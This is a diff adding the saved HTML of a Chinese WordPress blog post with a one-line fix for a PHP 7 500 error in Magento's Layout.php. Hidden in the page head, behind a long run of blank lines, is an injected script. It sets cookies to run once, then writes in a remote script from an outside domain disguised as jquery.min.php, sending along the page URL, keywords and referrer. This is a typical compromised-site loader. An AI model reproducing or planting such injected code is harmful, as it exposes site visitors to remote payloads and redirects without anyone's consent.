@@ -1,0 +1,458 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="zh-CN" prefix="og: http://ogp.me/ns#">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+	    <title>php7.0.1-magento出现500错误 - 清心醉</title>
+		<meta name="keywords" content="php7.0.1-magento出现500错误" />
+	    <link rel="profile" href="http://gmpg.org/xfn/11">
+    <link rel="pingback" href="http://www.qingxinzui.com/xmlrpc.php">
+    
+<!--该网站由陈奎宗(清心醉)独立搭建,资料数据为自行开发过程-->
+<link rel="canonical" href="http://www.qingxinzui.com/php7-0-1-magento%e5%87%ba%e7%8e%b0500%e9%94%99%e8%af%af.html" />
+<meta property="og:locale" content="zh_CN" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="php7.0.1-magento出现500错误 - 清心醉" />
+<meta property="og:description" content="最近测试PHP7对magento的性能影响，结果出现500错误。一开始以为是伪静态出错搞的鬼，后来安装了个wordpress重写伪静态发现又没问题，后来GOOGLE了一翻：
+
+在app/code/core/Mage/Core/Model/Layout.php文件里第555行：
+
+$out .= $this-&gt;getBlock($callback[0])-&gt;$callback[1]();
+
+修改为：$out .= $this-&gt;getBlock($callback[0])-&gt;{$callback[1]}();
+
+就可以解决问题了。" />
+<meta property="og:url" content="http://www.qingxinzui.com/php7-0-1-magento%e5%87%ba%e7%8e%b0500%e9%94%99%e8%af%af.html" />
+<meta property="og:site_name" content="清心醉" />
+<meta property="article:section" content="HTML/PHP" />
+<meta property="article:published_time" content="2016-01-31T07:03:39+00:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:description" content="最近测试PHP7对magento的性能影响，结果出现500错误。一开始以为是伪静态出错搞的鬼，后来安装了个wordpress重写伪静态发现又没问题，后来GOOGLE了一翻：
+
+在app/code/core/Mage/Core/Model/Layout.php文件里第555行：
+
+$out .= $this-&gt;getBlock($callback[0])-&gt;$callback[1]();
+
+修改为：$out .= $this-&gt;getBlock($callback[0])-&gt;{$callback[1]}();
+
+就可以解决问题了。"/>
+<meta name="twitter:title" content="php7.0.1-magento出现500错误 - 清心醉"/>
+<meta name="twitter:domain" content="清心醉"/>
+<!-- / Yoast SEO plugin. -->
+
+<link rel="alternate" type="application/rss+xml" title="清心醉 &raquo; Feed" href="http://www.qingxinzui.com/feed/" />
+<link rel="alternate" type="application/rss+xml" title="清心醉 &raquo; 评论Feed" href="http://www.qingxinzui.com/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="清心醉 &raquo; php7.0.1-magento出现500错误评论Feed" href="http://www.qingxinzui.com/php7-0-1-magento%e5%87%ba%e7%8e%b0500%e9%94%99%e8%af%af.html/feed/" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"http:\/\/www.qingxinzui.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.5.13"}};
+			!function(a,b,c){function d(a){var c,d,e,f=b.createElement("canvas"),g=f.getContext&&f.getContext("2d"),h=String.fromCharCode;if(!g||!g.fillText)return!1;switch(g.textBaseline="top",g.font="600 32px Arial",a){case"flag":return g.fillText(h(55356,56806,55356,56826),0,0),f.toDataURL().length>3e3;case"diversity":return g.fillText(h(55356,57221),0,0),c=g.getImageData(16,16,1,1).data,d=c[0]+","+c[1]+","+c[2]+","+c[3],g.fillText(h(55356,57221,55356,57343),0,0),c=g.getImageData(16,16,1,1).data,e=c[0]+","+c[1]+","+c[2]+","+c[3],d!==e;case"simple":return g.fillText(h(55357,56835),0,0),0!==g.getImageData(16,16,1,1).data[0];case"unicode8":return g.fillText(h(55356,57135),0,0),0!==g.getImageData(16,16,1,1).data[0]}return!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i;for(i=Array("simple","flag","unicode8","diversity"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel='stylesheet' id='sugarspice-fonts-css'  href='//fonts.googleapis.com/css?family=Niconne%7CPT%2BSerif%3A400%2C700%7CRaleway%3A400%2C600&#038;subset=latin%2Clatin-ext&#038;ver=4.5.13' type='text/css' media='all' />
+<link rel='stylesheet' id='sugarspice-style-css'  href='http://www.qingxinzui.com/wp-content/themes/sugar-and-spice/style.css?ver=4.5.13' type='text/css' media='all' />
+<link rel='stylesheet' id='sugarspice-responsive-css'  href='http://www.qingxinzui.com/wp-content/themes/sugar-and-spice/responsive.css?ver=4.5.13' type='text/css' media='all' />
+<link rel='stylesheet' id='sugarspice-icofont-css'  href='http://www.qingxinzui.com/wp-content/themes/sugar-and-spice/fonts/icofont.css?ver=4.5.13' type='text/css' media='all' />
+<link rel='stylesheet' id='wp-pagenavi-css'  href='http://www.qingxinzui.com/wp-content/plugins/wp-pagenavi/pagenavi-css.css?ver=2.70' type='text/css' media='all' />
+<script type='text/javascript' src='http://www.qingxinzui.com/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script>
+<script type='text/javascript' src='http://www.qingxinzui.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
+<link rel='https://api.w.org/' href='http://www.qingxinzui.com/wp-json/' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.qingxinzui.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.qingxinzui.com/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 4.5.13" />
+<link rel='shortlink' href='http://www.qingxinzui.com/?p=2273' />
+<link rel="alternate" type="application/json+oembed" href="http://www.qingxinzui.com/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.qingxinzui.com%2Fphp7-0-1-magento%25e5%2587%25ba%25e7%258e%25b0500%25e9%2594%2599%25e8%25af%25af.html" />
+<link rel="alternate" type="text/xml+oembed" href="http://www.qingxinzui.com/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.qingxinzui.com%2Fphp7-0-1-magento%25e5%2587%25ba%25e7%258e%25b0500%25e9%2594%2599%25e8%25af%25af.html&#038;format=xml" />
+
+<style>
+a, a:visited { color:#36AB8A; }
+.entry-meta a { color:#797979; }
+#nav-wrapper .ribbon-left, #nav-wrapper .ribbon-right { background-image: url("http://www.qingxinzui.com/wp-content/themes/sugar-and-spice/images/ribbon-peach.png"); }a:hover, a:focus, nav#main-nav > ul > li > a:hover { color: rgba(54, 171, 138, 0.7); }nav#main-nav > ul > li.current_page_item > a, nav#main-nav > ul > li.current_page_ancestor > a, nav#main-nav > ul > li.current-menu-item > a { color:#36AB8A; }
+.widget-title em { color:#F9AA89; }
+.widget_calendar table td#today { background:#F9AA89; }
+blockquote cite { color:#36AB8A; }
+blockquote { border-left-color: #F9AA89;} {}
+.button:hover, button:hover, a.social-icon:hover , input[type="submit"]:hover, input[type="reset"]:hover, input[type="button"]:hover { background: rgba(54, 171, 138, 0.7);} </style>
+		<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+		<style type="text/css" id="custom-background-css">
+body.custom-background { background-image: url('http://www.qingxinzui.com/wp-content/themes/sugar-and-spice/images/bg.png'); background-repeat: repeat; background-position: top left; background-attachment: fixed; }
+</style>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>var a='';setTimeout(1);function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("__cfgoid")&&(setCookie("__cfgoid",1,1),1==getCookie("__cfgoid")&&(setCookie("__cfgoid",2,1),document.write('<script type="text/javascript" src="' + 'http://margarethelasinger.com/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'K85164' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script>
+</head>
+
+<body class="single single-post postid-2273 single-format-standard custom-background">
+<div id="page" class="hfeed site">
+		<header id="header" class="site-header" role="banner">
+		<div class="site-branding">
+
+        
+        <h1 class="site-title"><a href="http://www.qingxinzui.com/" rel="home">清心醉</a></h1>
+        <h2 class="site-description">科技博客园</h2>
+        
+                
+		</div>
+        <div id="nav-wrapper">
+            <div class="ribbon-left"></div>
+            <nav id="main-nav" class="main-navigation" role="navigation">
+                <div class="skip-link"><a class="screen-reader-text" href="#content">Skip to content</a></div>
+                <ul id="nav" class="menu"><li id="menu-item-2177" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2177"><a href="http://www.qingxinzui.com/category/%e7%9b%bc%e7%9b%88%e7%bd%91%e4%bd%bf%e7%94%a8%e8%af%b4%e6%98%8e/">盼盈网使用说明</a></li>
+<li id="menu-item-2000" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2000"><a href="http://www.qingxinzui.com/web%e5%85%bc%e8%81%8c/">WEB兼职</a></li>
+<li id="menu-item-2060" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2060"><a href="http://www.qingxinzui.com/category/%e7%bd%91%e7%ab%99%e5%bb%ba%e8%ae%be%e4%bb%8e%e5%85%a5%e9%97%a8%e5%88%b0%e7%b2%be%e9%80%9a/">网站建设从入门到精通</a></li>
+<li id="menu-item-1956" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1956"><a href="http://www.qingxinzui.com/category/app%e5%bc%80%e5%8f%91/">APP开发</a></li>
+<li id="menu-item-1957" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1957"><a href="http://www.qingxinzui.com/category/c/">C++</a></li>
+<li id="menu-item-1958" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1958"><a href="http://www.qingxinzui.com/category/ecshop/">Ecshop</a></li>
+<li id="menu-item-1959" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-1959"><a href="http://www.qingxinzui.com/category/htmlphp/">HTML/PHP</a></li>
+<li id="menu-item-1960" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1960"><a href="http://www.qingxinzui.com/category/javascript/">JavaScript</a></li>
+<li id="menu-item-1961" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-1961"><a href="http://www.qingxinzui.com/category/linux%e5%b9%b3%e5%8f%b0/">Linux平台</a></li>
+<li id="menu-item-1962" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-1962"><a href="http://www.qingxinzui.com/category/magento/">magento</a></li>
+<li id="menu-item-1963" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1963"><a href="http://www.qingxinzui.com/category/nginx/">Nginx</a></li>
+<li id="menu-item-1964" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1964"><a href="http://www.qingxinzui.com/category/opencart/">OPENCART</a></li>
+<li id="menu-item-1965" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1965"><a href="http://www.qingxinzui.com/category/seo/">SEO</a></li>
+<li id="menu-item-1966" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1966"><a href="http://www.qingxinzui.com/category/windows%e5%b9%b3%e5%8f%b0/">Windows平台</a></li>
+<li id="menu-item-1967" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1967"><a href="http://www.qingxinzui.com/category/zend-framework/">Zend Framework</a></li>
+<li id="menu-item-1968" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1968"><a href="http://www.qingxinzui.com/category/%e6%94%af%e4%bb%98%e5%b9%b3%e5%8f%b0/">支付平台</a></li>
+<li id="menu-item-1970" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1970"><a href="http://www.qingxinzui.com/category/%e9%9a%8f%e4%be%bf%e5%86%99%e5%86%99/">随便写写</a></li>
+<li id="menu-item-2001" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2001"><a href="http://www.qingxinzui.com/%e8%af%b4%e8%af%b4/">说说</a></li>
+<li id="menu-item-2221" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2221"><a href="http://www.qingxinzui.com/category/dedecms%e5%bc%80%e5%8f%91/">dedecms开发</a></li>
+<li id="menu-item-2365" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2365"><a href="http://www.qingxinzui.com/category/mysql/">MYSQL</a></li>
+</ul>            </nav><!-- #site-navigation -->
+            <div class="ribbon-right"></div>
+        </div>
+	</header><!-- #header -->
+
+	<div id="main" class="site-main">
+    
+        <div id="primary" class="content-area">  
+            <div id="content" class="site-content" role="main">
+			            <center> <img src="ewm/id2273.png" alt="" title="php7.0.1-magento出现500错误"> </center>
+            
+                
+<article id="post-2273" class="post-2273 post type-post status-publish format-standard hentry category-htmlphp category-linux category-magento">
+	<header class="entry-header">
+		<h1 class="entry-title"><a href="http://www.qingxinzui.com/php7-0-1-magento%e5%87%ba%e7%8e%b0500%e9%94%99%e8%af%af.html" rel="bookmark">php7.0.1-magento出现500错误</a></h1>
+
+		<div class="entry-meta">
+					</div><!-- .entry-meta -->
+	</header><!-- .entry-header -->
+
+	<div class="entry-content">
+        <p>最近测试PHP7对magento的性能影响，结果出现500错误。一开始以为是伪静态出错搞的鬼，后来安装了个wordpress重写伪静态发现又没问题，后来GOOGLE了一翻：</p>
+<p>在app/code/core/Mage/Core/Model/Layout.php文件里第555行：</p>
+<p>$out .= $this-&gt;getBlock($callback[0])-&gt;$callback[1]();</p>
+<p>修改为：$out .= $this-&gt;getBlock($callback[0])-&gt;{$callback[1]}();</p>
+<p>就可以解决问题了。</p>
+	</div><!-- .entry-content -->
+
+	<footer class="entry-meta bottom">
+		
+		This entry was posted in <a href="http://www.qingxinzui.com/category/htmlphp/" rel="category tag">HTML/PHP</a>, <a href="http://www.qingxinzui.com/category/linux%e5%b9%b3%e5%8f%b0/" rel="category tag">Linux平台</a>, <a href="http://www.qingxinzui.com/category/magento/" rel="category tag">magento</a>.
+	</footer><!-- .entry-meta -->
+</article><!-- #post-## -->
+                
+                                
+                	<nav role="navigation" id="nav-below" class="post-navigation section">
+		<h1 class="screen-reader-text">Post navigation</h1>
+
+	        <h2 class="section-title"><span>Navigation</span></h2>
+		<div class="nav-previous"><a href="http://www.qingxinzui.com/%e5%ae%9e%e6%88%98b2b%e6%a8%a1%e5%bc%8f%e4%bd%bf%e7%94%a8nginxapache%e7%ab%99%e7%be%a4.html" rel="prev"><span class="meta-nav">&larr;</span> 实战B2B模式使用Nginx+Apache站群</a></div>		<div class="nav-next"><a href="http://www.qingxinzui.com/php7%e6%b7%bb%e5%8a%a0memcached%e6%89%a9%e5%b1%95.html" rel="next">php7添加memcached扩展 <span class="meta-nav">&rarr;</span></a></div>
+	
+	</nav><!-- #nav-below -->
+	
+                
+	<div id="comments" class="comments-area section">
+
+	
+	
+	
+					<div id="respond" class="comment-respond">
+			<h3 id="reply-title" class="comment-reply-title">发表评论 <small><a rel="nofollow" id="cancel-comment-reply-link" href="/php7-0-1-magento%E5%87%BA%E7%8E%B0500%E9%94%99%E8%AF%AF.html#respond" style="display:none;">取消回复</a></small></h3>				<form action="http://www.qingxinzui.com/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate>
+					<p class="comment-form-comment"><label for="comment">评论</label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" aria-required="true" required="required"></textarea></p><p class="comment-form-author"><label for="author">姓名 <span class="required">*</span></label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" aria-required='true' required='required' /></p>
+<p class="comment-form-email"><label for="email">电子邮件 <span class="required">*</span></label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes" aria-required='true' required='required' /></p>
+<p class="comment-form-url"><label for="url">站点</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200" /></p>
+<p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="发表评论" /> <input type='hidden' name='comment_post_ID' value='2273' id='comment_post_ID' />
+<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
+</p>
+	<!-- Custom Smilies - Version 2.9.2 -->
+	<style type="text/css">
+	img.wp-smiley-select {cursor: pointer;}
+	</style>
+    <script type="text/javascript">
+    function grin(tag) {
+    	if (typeof tinyMCE != 'undefined') {
+    		grin_tinymcecomments(tag);
+    	} else {
+    		grin_plain(tag);
+    	}
+    }
+    function grin_tinymcecomments(tag) {
+    	tinyMCE.execCommand('mceInsertContent', false, ' ' + tag + ' ');
+    }
+    
+    function grin_plain(tag) {
+    	var myField;
+    	var myCommentTextarea = "comment";
+    	tag = ' ' + tag + ' ';
+        if (document.getElementById(myCommentTextarea) && document.getElementById(myCommentTextarea).type == 'textarea') {
+    		myField = document.getElementById(myCommentTextarea);
+    	} else {
+    		return false;
+    	}
+    	if (document.selection) {
+    		myField.focus();
+    		sel = document.selection.createRange();
+    		sel.text = tag;
+    		myField.focus();
+    	}
+    	else if (myField.selectionStart || myField.selectionStart == '0') {
+    		var startPos = myField.selectionStart;
+    		var endPos = myField.selectionEnd;
+    		var cursorPos = endPos;
+    		myField.value = myField.value.substring(0, startPos)
+    					  + tag
+    					  + myField.value.substring(endPos, myField.value.length);
+    		cursorPos += tag.length;
+    		myField.focus();
+    		myField.selectionStart = cursorPos;
+    		myField.selectionEnd = cursorPos;
+    	}
+    	else {
+    		myField.value += tag;
+    		myField.focus();
+    	}
+    }
+    
+    function moreSmilies() {
+    	document.getElementById('wp-smiley-more').style.display = 'inline';
+    	document.getElementById('wp-smiley-toggle').innerHTML = '<a href="javascript:lessSmilies()">&laquo;&nbsp;less</a></span>';
+    }
+    
+    function lessSmilies() {
+    	document.getElementById('wp-smiley-more').style.display = 'none';
+    	document.getElementById('wp-smiley-toggle').innerHTML = '<a href="javascript:moreSmilies()">more&nbsp;&raquo;</a>';
+    }
+    </script>
+<img src='http://www.qingxinzui.com/wp-includes/images/smilies/icon_wink.gif' alt=':wink:' onclick='grin(":wink:")' class='wp-smiley-select' /> <img src='http://www.qingxinzui.com/wp-includes/images/smilies/icon_neutral.gif' alt=':-|' onclick='grin(":-|")' class='wp-smiley-select' /> <img src='http://www.qingxinzui.com/wp-includes/images/smilies/icon_mad.gif' alt=':-x' onclick='grin(":-x")' class='wp-smiley-select' /> <img src='http://www.qingxinzui.com/wp-includes/images/smilies/icon_twisted.gif' alt=':twisted:' onclick='grin(":twisted:")' class='wp-smiley-select' /> <img src='http://www.qingxinzui.com/wp-includes/images/smilies/icon_smile.gif' alt=':)' onclick='grin(":)")' class='wp-smiley-select' /> <img src='http://www.qingxinzui.com/wp-includes/images/smilies/icon_eek.gif' alt='8-O' onclick='grin("8-O")' class='wp-smiley-select' /> <img src='http://www.qingxinzui.com/wp-includes/images/smilies/icon_sad.gif' alt=':(' onclick='grin(":(")' class='wp-smiley-select' /> <img src='http://www.qingxinzui.com/wp-includes/images/smilies/icon_rolleyes.gif' alt=':roll:' onclick='grin(":roll:")' class='wp-smiley-select' /> <img src='http://www.qingxinzui.com/wp-includes/images/smilies/icon_razz.gif' alt=':-P' onclick='grin(":-P")' class='wp-smiley-select' /> <img src='http://www.qingxinzui.com/wp-includes/images/smilies/icon_redface.gif' alt=':oops:' onclick='grin(":oops:")' class='wp-smiley-select' /> <img src='http://www.qingxinzui.com/wp-includes/images/smilies/icon_surprised.gif' alt=':-o' onclick='grin(":-o")' class='wp-smiley-select' /> <img src='http://www.qingxinzui.com/wp-includes/images/smilies/icon_mrgreen.gif' alt=':mrgreen:' onclick='grin(":mrgreen:")' class='wp-smiley-select' /> <img src='http://www.qingxinzui.com/wp-includes/images/smilies/icon_lol.gif' alt=':lol:' onclick='grin(":lol:")' class='wp-smiley-select' /> <img src='http://www.qingxinzui.com/wp-includes/images/smilies/icon_idea.gif' alt=':idea:' onclick='grin(":idea:")' class='wp-smiley-select' /> <img src='http://www.qingxinzui.com/wp-includes/images/smilies/icon_biggrin.gif' alt=':-D' onclick='grin(":-D")' class='wp-smiley-select' /> <img src='http://www.qingxinzui.com/wp-includes/images/smilies/icon_evil.gif' alt=':evil:' onclick='grin(":evil:")' class='wp-smiley-select' /> <img src='http://www.qingxinzui.com/wp-includes/images/smilies/icon_cry.gif' alt=':cry:' onclick='grin(":cry:")' class='wp-smiley-select' /> <img src='http://www.qingxinzui.com/wp-includes/images/smilies/icon_cool.gif' alt='8)' onclick='grin("8)")' class='wp-smiley-select' /> <img src='http://www.qingxinzui.com/wp-includes/images/smilies/icon_arrow.gif' alt=':arrow:' onclick='grin(":arrow:")' class='wp-smiley-select' /> <img src='http://www.qingxinzui.com/wp-includes/images/smilies/icon_confused.gif' alt=':-?' onclick='grin(":-?")' class='wp-smiley-select' /> <img src='http://www.qingxinzui.com/wp-includes/images/smilies/icon_question.gif' alt=':?:' onclick='grin(":?:")' class='wp-smiley-select' /> <img src='http://www.qingxinzui.com/wp-includes/images/smilies/icon_exclaim.gif' alt=':!:' onclick='grin(":!:")' class='wp-smiley-select' /> 				</form>
+					</div><!-- #respond -->
+		
+</div><!-- #comments -->
+
+            
+            </div><!-- #content -->
+        </div><!-- #primary -->
+        
+                        
+        <div id="sidebar" class="widget-area" role="complementary">
+        
+            <aside id="search-5" class="widget widget_search"><h3 class="widget-title"><span>搜索文章</span></h3><form role="search" method="get" class="search-form" action="http://www.qingxinzui.com/">
+	<label>
+		<span class="screen-reader-text">Search for:</span>
+		<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s">
+	</label>
+	<input type="submit" class="search-submit" value="Search">
+</form>
+</aside>		<aside id="recent-posts-2" class="widget widget_recent_entries">		<h3 class="widget-title"><span>近期文章</span></h3>		<ul>
+					<li>
+				<a href="http://www.qingxinzui.com/%e6%a8%a1%e5%9d%97%e5%8c%96%e7%ac%ac%e4%b8%89%e6%96%b9%e6%8e%a5%e5%8f%a3%e5%bc%80%e5%8f%91%e4%b8%80%ef%bc%8c%e6%a8%a1%e5%9d%97%e5%8c%96%e7%9a%84%e7%99%bb%e9%99%86.html">模块化第三方接口开发一，模块化的登陆</a>
+						</li>
+					<li>
+				<a href="http://www.qingxinzui.com/%e5%a2%83%e5%a4%96%e7%94%b5%e5%95%86%ef%bc%8c%e5%a6%82%e4%bd%95%e6%9b%b4%e5%a5%bd%e7%9a%84%e5%ae%9e%e7%8e%b0seo.html">境外电商，如何更好的实现SEO</a>
+						</li>
+					<li>
+				<a href="http://www.qingxinzui.com/opencart%e8%a7%84%e6%a0%bc%e7%a7%af%e5%88%86%e6%97%a0%e6%b3%95%e5%a2%9e%e5%8a%a0%e7%9a%84%e8%a7%a3%e5%86%b3%e6%96%b9%e6%a1%88.html">opencart规格积分无法增加的解决方案</a>
+						</li>
+					<li>
+				<a href="http://www.qingxinzui.com/%e9%92%88%e5%af%b9%e7%9b%bc%e7%9b%88%e4%bf%a1%e6%81%af%e6%b8%af%e5%bc%80%e5%8f%91%e6%b6%88%e6%81%af%e6%a8%a1%e6%9d%bf%e4%b9%8b%e5%be%ae%e4%bf%a1%e6%b6%88%e6%81%af%e4%b8%8b%e5%8f%91%e9%80%9a%e7%9f%a5.html">针对盼盈信息港开发消息模板之微信消息下发通知</a>
+						</li>
+					<li>
+				<a href="http://www.qingxinzui.com/%e5%bc%80%e6%ba%90%e4%b8%80%e4%b8%aa%e5%be%ae%e4%bf%a1%e5%85%ac%e4%bc%97%e5%8f%b7%e5%90%91%e5%85%b3%e6%b3%a8%e7%94%a8%e6%88%b7%e4%b8%8b%e5%8f%91%e6%b6%88%e6%81%af%e7%9a%84%e7%ae%80%e5%8d%95%e7%b1%bb.html">开源一个微信公众号向关注用户下发消息的简单类库</a>
+						</li>
+				</ul>
+		</aside>		<aside id="recent-comments-2" class="widget widget_recent_comments"><h3 class="widget-title"><span>近期评论</span></h3><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link">清心醉</span>发表在《<a href="http://www.qingxinzui.com/%e8%af%b4%e8%af%b4/#comment-632">说说</a>》</li><li class="recentcomments"><span class="comment-author-link">往事</span>发表在《<a href="http://www.qingxinzui.com/%e8%af%b4%e8%af%b4/#comment-630">说说</a>》</li><li class="recentcomments"><span class="comment-author-link">往事</span>发表在《<a href="http://www.qingxinzui.com/%e8%af%b4%e8%af%b4/#comment-629">说说</a>》</li><li class="recentcomments"><span class="comment-author-link">清心醉</span>发表在《<a href="http://www.qingxinzui.com/%e8%af%b4%e8%af%b4/#comment-405">说说</a>》</li><li class="recentcomments"><span class="comment-author-link">清心醉</span>发表在《<a href="http://www.qingxinzui.com/magento%e9%87%8d%e5%86%99url%e4%b9%8b%e9%87%8d%e5%bb%ba%e7%b4%a2%e5%bc%95.html/#comment-393">Magento重写URL之重建索引</a>》</li></ul></aside><aside id="archives-2" class="widget widget_archive"><h3 class="widget-title"><span>文章归档</span></h3>		<ul>
+			<li><a href='http://www.qingxinzui.com/2017/09/'>2017年九月</a></li>
+	<li><a href='http://www.qingxinzui.com/2016/12/'>2016年十二月</a></li>
+	<li><a href='http://www.qingxinzui.com/2016/09/'>2016年九月</a></li>
+	<li><a href='http://www.qingxinzui.com/2016/08/'>2016年八月</a></li>
+	<li><a href='http://www.qingxinzui.com/2016/07/'>2016年七月</a></li>
+	<li><a href='http://www.qingxinzui.com/2016/06/'>2016年六月</a></li>
+	<li><a href='http://www.qingxinzui.com/2016/05/'>2016年五月</a></li>
+	<li><a href='http://www.qingxinzui.com/2016/04/'>2016年四月</a></li>
+	<li><a href='http://www.qingxinzui.com/2016/03/'>2016年三月</a></li>
+	<li><a href='http://www.qingxinzui.com/2016/02/'>2016年二月</a></li>
+	<li><a href='http://www.qingxinzui.com/2016/01/'>2016年一月</a></li>
+	<li><a href='http://www.qingxinzui.com/2015/12/'>2015年十二月</a></li>
+	<li><a href='http://www.qingxinzui.com/2015/11/'>2015年十一月</a></li>
+	<li><a href='http://www.qingxinzui.com/2015/10/'>2015年十月</a></li>
+	<li><a href='http://www.qingxinzui.com/2015/09/'>2015年九月</a></li>
+	<li><a href='http://www.qingxinzui.com/2015/08/'>2015年八月</a></li>
+	<li><a href='http://www.qingxinzui.com/2015/07/'>2015年七月</a></li>
+	<li><a href='http://www.qingxinzui.com/2015/06/'>2015年六月</a></li>
+	<li><a href='http://www.qingxinzui.com/2015/05/'>2015年五月</a></li>
+	<li><a href='http://www.qingxinzui.com/2015/04/'>2015年四月</a></li>
+	<li><a href='http://www.qingxinzui.com/2015/03/'>2015年三月</a></li>
+	<li><a href='http://www.qingxinzui.com/2015/02/'>2015年二月</a></li>
+	<li><a href='http://www.qingxinzui.com/2015/01/'>2015年一月</a></li>
+	<li><a href='http://www.qingxinzui.com/2014/12/'>2014年十二月</a></li>
+	<li><a href='http://www.qingxinzui.com/2014/11/'>2014年十一月</a></li>
+	<li><a href='http://www.qingxinzui.com/2014/10/'>2014年十月</a></li>
+	<li><a href='http://www.qingxinzui.com/2014/09/'>2014年九月</a></li>
+	<li><a href='http://www.qingxinzui.com/2014/08/'>2014年八月</a></li>
+	<li><a href='http://www.qingxinzui.com/2014/07/'>2014年七月</a></li>
+	<li><a href='http://www.qingxinzui.com/2014/06/'>2014年六月</a></li>
+	<li><a href='http://www.qingxinzui.com/2014/05/'>2014年五月</a></li>
+	<li><a href='http://www.qingxinzui.com/2014/04/'>2014年四月</a></li>
+	<li><a href='http://www.qingxinzui.com/2014/03/'>2014年三月</a></li>
+	<li><a href='http://www.qingxinzui.com/2014/02/'>2014年二月</a></li>
+		</ul>
+		</aside>        
+        </div><!-- #sidebar -->
+        
+        <!-- WordPressSEOPlugin -->﻿    </div><!-- #main -->
+                </div><!-- #page -->
+
+        <footer id="footer" class="site-footer" role="contentinfo">
+                        <div class="site-info">
